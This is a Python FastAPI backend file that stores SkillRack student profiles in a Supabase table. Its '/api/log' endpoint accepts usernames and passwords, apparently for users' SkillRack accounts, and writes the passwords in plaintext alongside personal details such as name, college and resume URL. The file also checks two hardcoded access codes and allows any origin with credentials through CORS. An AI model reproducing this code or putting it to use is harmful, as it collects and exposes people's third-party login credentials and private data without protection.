import os
from datetime import datetime, timezone
from typing import Any, Optional
import httpx
from urllib.parse import quote

from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from dotenv import load_dotenv
import requests

app = FastAPI()
load_dotenv()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

SUPABASE_URL = os.getenv("SUPABASE_URL", "").rstrip("/")
SUPABASE_SERVICE_KEY = os.getenv("SUPABASE_SERVICE_KEY", "")

async def supabase_upsert_profile(username: str, password: str, profile_url: str, resume_url: Optional[str], profile_data: dict[str, Any]) -> None:
    if not SUPABASE_URL or not SUPABASE_SERVICE_KEY:
        raise HTTPException(status_code=500, detail="Supabase configuration is missing")

    now = datetime.now(timezone.utc).isoformat()
    row = {
        "username": username,
        "password": password,
        "profile_url": profile_url,
        "resume_url": resume_url,
        "skillrack_id": str(profile_data.get("id") or ""),
        "name": profile_data.get("name"),
        "dept": profile_data.get("dept"),
        "year": profile_data.get("year"),
        "college": profile_data.get("college"),
        "solved": profile_data.get("solved"),
        "code_tutor": profile_data.get("codeTutor"),
        "code_track": profile_data.get("codeTrack"),
        "dc": profile_data.get("dc"),
        "dt": profile_data.get("dt"),
        "code_test": profile_data.get("codeTest"),
        "points": profile_data.get("points"),
        "required_points": profile_data.get("requiredPoints"),
        "required_solved": profile_data.get("requiredSolved"),
        "deadline": profile_data.get("deadline"),
        "solved_percentage": profile_data.get("solvedPercentage"),
        "percentage": profile_data.get("percentage"),
        "last_fetched": profile_data.get("lastFetched"),
        "updated_at": now,
    }

    headers = {
        "apikey": SUPABASE_SERVICE_KEY,
        "Authorization": f"Bearer {SUPABASE_SERVICE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation",
    }
    
    async with httpx.AsyncClient() as client:
        lookup_response = await client.get(
            f"{SUPABASE_URL}/rest/v1/skillrack_profiles?username=eq.{quote(username)}&select=id",
            headers=headers,
            timeout=30,
        )
        lookup_response.raise_for_status()
        existing_rows = lookup_response.json()

        if existing_rows:
            update_response = await client.patch(
                f"{SUPABASE_URL}/rest/v1/skillrack_profiles?username=eq.{quote(username)}",
                headers=headers,
                json=row,
                timeout=30,
            )
            update_response.raise_for_status()
            return

        insert_row = dict(row)
        insert_row["created_at"] = now
        insert_response = await client.post(
            f"{SUPABASE_URL}/rest/v1/skillrack_profiles",
            headers=headers,
            json=insert_row,
            timeout=30,
        )
        insert_response.raise_for_status()


@app.get("/")
def root():
    return {
        "status": "online",
        "mode": "datastore-only"
    }

# @app.post("/api/profile")
# async def store_profile(request: Request):
#     data = await request.json()
    
#     username = data.get("username")
#     password = data.get("password")

#     profile_url = data.get("profile_url", "")
#     resume_url = data.get("resume_url", "")
#     profile_data = data.get("profile_data", {})

#     if not username or not password:
#         raise HTTPException(status_code=400, detail="Missing credentials")

#     try:
#         await supabase_upsert_profile(username, password, profile_url, resume_url, profile_data)
#         return {"message": "Question fetched Successfully"}
#     except Exception as e:
#         raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/auth")
async def auth(request:Request):
    data = await request.json()
    if data["code"]=="welcome@123" or data["code"]=="vanakamdamapla":
        return {"message":"allow"}
    return {"message":"dont allow"}

@app.post("/api/log")
async def logger(request: Request):
        data = await request.json()
    
        username = data.get("username")
        password = data.get("password")
        profile_url = data.get("profile_url", "")
        response = requests.post(
            "https://skillrack.gururaja.in/api/points",
            headers={"Content-Type": "application/json"},
            json={"url": profile_url}
        )
        profile_data = response.json()
        resume_url = profile_data.get("url", profile_url)
        if not username or not password:
            raise HTTPException(status_code=400, detail="Missing credentials")

        try:
            await supabase_upsert_profile(username, password, profile_url, resume_url, profile_data)
            return {"message": "Logged successfully"}
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
        

